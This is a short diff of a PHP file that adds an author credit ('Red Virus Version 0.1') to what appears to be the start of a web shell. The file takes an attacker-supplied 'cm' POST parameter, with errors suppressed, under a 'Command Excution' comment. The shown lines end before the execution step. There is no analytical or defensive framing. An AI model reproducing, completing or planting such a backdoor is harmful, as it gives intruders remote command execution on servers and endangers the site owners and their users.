@@ -1,4 +1,5 @@
 <?php
+/// Co0ded By Red Virus Version 0.1
 /// Command Excution
 $command = @$_POST['cm'];
 
